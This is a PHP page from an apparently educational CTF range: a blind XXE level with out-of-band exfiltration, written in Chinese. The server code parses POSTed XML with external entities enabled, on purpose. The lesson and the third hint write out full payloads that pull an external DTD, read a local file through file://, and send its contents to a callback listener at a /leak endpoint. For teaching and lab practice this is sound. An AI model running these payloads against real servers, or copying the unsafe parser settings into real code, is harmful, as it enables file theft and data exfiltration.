<?php
// ============================================================
// xxe2 · XXE 盲注（OOB 带外）
// 漏洞：与 xxe1 相同的 loadXML(NOENT|DTDLOAD)，但【不回显任何文本内容】
//       只显示"导入成功 + 条目数"→ 只能走 OOB：
//       参数实体 %remote SYSTEM "http://oob/evil.dtd" → 外部 DTD 读文件
//       → 把内容拼进回调 URL 发给 OOB 监听服务
// 配套：oob_server.js（Node 零依赖，默认端口 8307）——本地模拟的
//       out-of-band 平台（真实场景=Burp Collaborator / requestbin）
// ============================================================
define('OOB_BASE', 'http://127.0.0.1:8307');   // 部署时 OOB 服务与靶机同主机

$candidates = array('/flag_xxe2.hex.txt', __DIR__ . '/deploy/flag_xxe2.hex.txt');
$hexFile = '/flag_xxe2.hex.txt';
foreach ($candidates as $c) { if (is_file($c)) { $hexFile = realpath($c); break; } }
$rawFile = dirname($hexFile) . '/flag_xxe2.txt';

$xml = isset($_POST['xml']) ? (string)$_POST['xml'] : '';
$parsed = null; $err = false;
if ($xml !== '') {
    libxml_use_internal_errors(true);
    $dom = new DOMDocument();
    $ok = @$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    libxml_clear_errors();
    if ($ok === false) { $err = true; $parsed = null; }
    else { $parsed = $dom->getElementsByTagName('item')->length; }
}
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES); }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>xxe2 · XXE 盲注 OOB | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:940px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#f472b6;color:#3b0a22;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
textarea{width:100%;min-height:150px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,Menlo,monospace;font-size:13px}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
.okbox{background:#052e16;border:1px solid #14532d;color:#bbf7d0;border-radius:8px;padding:14px 16px;margin-top:12px}
.errbox{background:#3b1519;border:1px solid #7f1d1d;color:#fca5a5;border-radius:8px;padding:10px 14px;margin-top:12px}
.pathbox{background:#052e16;border:1px solid #14532d;color:#bbf7d0;border-radius:8px;padding:10px 14px;margin-top:12px;font-size:14px}
a{color:var(--acc)}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">XXE · 第 2 关</span>
<h1>星际物流 · 运单批量导入（无回显）</h1>
<div class="meta">难度：★★★★☆ 高阶 | 关卡 ID：<code>xxe2</code> · 运行时：PHP + OOB 监听（Node）</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>上次的"简历回显"事件后，HR 系统下线了回显。但物流系统用了<b>同一套解析代码</b>——只是这次无论导入什么，页面只告诉你"导入成功，共 N 条记录"，<b>绝不再显示任何文本内容</b>。</p>
<p>机密档案换了个新位置（还是告诉你）——档案室为了能在"老式 URI 日志系统"里归档，还额外生成了一份 <b>URL 安全的十六进制镜像</b>：</p>
<div class="pathbox">🗂️ 机密档案（原文，含 <code>{}</code> 等字符）：<code><?= h($rawFile) ?></code><br>
🗂️ 十六进制镜像（URL 安全）：<code><?= h($hexFile) ?></code></div>
<p>靶场配套了一个 <b>OOB（带外）监听平台</b>（模拟真实世界的 Burp Collaborator / requestbin），控制台：<a href="<?= h(OOB_BASE) ?>/" target="_blank"><?= h(OOB_BASE) ?>/</a> ——上面有实时"泄露数据"日志。你的目标：让靶机把档案内容<b>主动送</b>到 OOB 平台。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="post" action="">
<label for="xml">运单 XML（每条运单一个 &lt;item&gt;）：</label><br><br>
<textarea id="xml" name="xml">&lt;batch&gt;
  &lt;item&gt;SX-0001 北京→上海&lt;/item&gt;
  &lt;item&gt;SX-0002 广州→成都&lt;/item&gt;
&lt;/batch&gt;</textarea><br><br>
<button type="submit">批量导入</button>
</form>
<?php if ($err): ?>
<div class="errbox">❌ 导入失败：XML 格式错误（详情不外显，联系管理员查日志）。<br><b>注意</b>："失败"只说明解析没走完——<b>不代表副作用没发生</b>（实体加载在报错之前就已经执行了）。</div>
<?php elseif ($parsed !== null): ?>
<div class="okbox">✅ 导入成功：共 <?= (int)$parsed ?> 条记录已入池。</div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>本关代码与 xxe1 唯一的区别——<b>没有回显</b>：</p>
<pre>&lt;?php
$dom = new DOMDocument();
@$dom-&gt;loadXML($_POST['xml'], LIBXML_NOENT | LIBXML_DTDLOAD);
echo '共 ' . $dom-&gt;getElementsByTagName('item')-&gt;length . ' 条';   // 只报数量</pre>
<p>读得到、看不见，怎么办？——<b>让服务器把内容"喊"出来</b>（OOB / 带外通道）：把要读的文件塞进一个 URL，让解析器去请求这个 URL。你的监听平台收到请求，数据就到了。</p>
<p>两级实体是关键（普通实体 <code>&amp;</code> 在 DTD 内部子集里不够用，要用<b>参数实体</b> <code>%</code>，且"实体值里再定义实体"只能发生在外部 DTD 中）：</p>
<pre>POST 给靶机（第 1 级：引诱解析器去拉你的 DTD）：
&lt;!DOCTYPE batch [
  &lt;!ENTITY % remote SYSTEM "http://&lt;OOB&gt;/evil.dtd?cb=http://&lt;OOB&gt;&amp;f=file:///&lt;档案路径&gt;"&gt;
  %remote;
]&gt;
&lt;batch&gt;&lt;item&gt;x&lt;/item&gt;&lt;/batch&gt;

OOB 平台动态生成的 evil.dtd（第 2 级：读文件 → 拼进回调 URL）：
&lt;!ENTITY % file SYSTEM "file:///&lt;档案路径&gt;"&gt;
&lt;!ENTITY % int "&lt;!ENTITY &#37; send SYSTEM 'http://&lt;OOB&gt;/leak?d=%file;'&gt;"&gt;
%int;
%send;</pre>
<p>要点：① <code>%file;</code> 读档案；② <code>&#37;</code> 是 <code>%</code> 的转义（实体值里不能裸写 %）；③ <code>%send;</code> 被解析时，档案内容已在 URL 里——请求发向 OOB 平台，日志落库。这就是"盲注变明"的带外手法，适用于一切"执行但不回显"的场景（SSRF 打内网、RCE 无回显同理）。</p>
<p>局限：档案内容会原样进入 URL——libxml 按 RFC 校验 URI 字符集，含 <code>{}</code>、空格、<code>&amp;</code>、换行的内容会把回调 URI 判成 <b>Invalid URI</b> 而发不出去（libxml 不认 php://filter，没有编码逃生门）。实战中常见出路：找 URL 安全的备份/镜像文件、FTP 通道、或只外带文件头部。本关就藏了一份十六进制镜像。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：确认没有回显、确认 OOB 平台活着</summary><p>随便导入一份 XML，页面只报条数。打开 <a href="<?= h(OOB_BASE) ?>/" target="_blank">OOB 控制台</a>，能看到平台给出的用法和实时日志（现在是空的）。</p></details>
<details><summary>提示 2：怎么让服务器"发出"一个请求</summary><p>外部实体的本质就是"解析器去请求一个 URL"。普通实体在 DTD 内部子集里玩不出花——改用<b>参数实体</b>（<code>%</code>），第一步先让靶机拉取你控制的<b>外部 DTD</b>（OOB 平台的 <code>/evil.dtd</code> 已经帮你生成第二级 payload，参数看控制台首页说明）。</p></details>
<details><summary>提示 3：完整 payload（读十六进制镜像）</summary><pre>&lt;!DOCTYPE batch [
  &lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8307/evil.dtd?cb=http://127.0.0.1:8307&amp;f=file:///&lt;hex 镜像路径&gt;"&gt;
  %remote;
]&gt;
&lt;batch&gt;&lt;item&gt;x&lt;/item&gt;&lt;/batch&gt;</pre><p>POST 给本页，回 OOB 控制台看日志里 <code>d=</code> 的一长串十六进制，本地解码（如 <code>python -c "print(bytes.fromhex('...'))"</code>）得到 flag。<br>（先试原档案也行：导入会"成功"，但 OOB 只有拉取 DTD 的记录、没有回调——<code>flag{...}</code> 的花括号过不了 URI 字符校验，这正是知识点的一部分。）</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../xxe1">← 上一关：xxe1</a><a href="../cors1">下一关：cors1 · CORS 反射 Origin →</a></nav>
<footer>CTF Web 教学式靶场 · F 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=xxe2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
